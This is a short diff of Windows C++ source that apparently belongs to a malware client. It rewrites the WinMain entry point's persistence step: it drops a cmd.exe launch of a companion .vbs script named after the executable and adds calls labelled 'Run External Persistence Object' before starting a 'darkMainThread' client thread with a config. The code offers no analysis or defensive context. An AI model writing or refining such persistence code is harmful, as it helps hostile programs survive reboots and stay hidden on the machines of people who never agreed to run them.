@@ -66,28 +66,12 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 			}
 		}
 
-
-
-		LPTSTR cmdPath = _T("cmd.exe");
+		//Run External Persistence Object
 		createLayer();
+		startLayer();
 
 
-
-		//Persistence Run Object
-	
-		std::string cmdArgs = "cmd.exe /k start " + Helpers::ExeName() + ".vbs";
-		ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, SW_SHOW);
-
-		
-	
-		std::cout << Helpers::ExeName();
-		//while (true) {
-			darkMain = std::thread(Client::darkMainThread, config);
-			//while (darkMain.joinable()) {
-
-			//}
-		//}
-
+		darkMain = std::thread(Client::darkMainThread, config);
 		darkMain.join();
 
 		return 0;
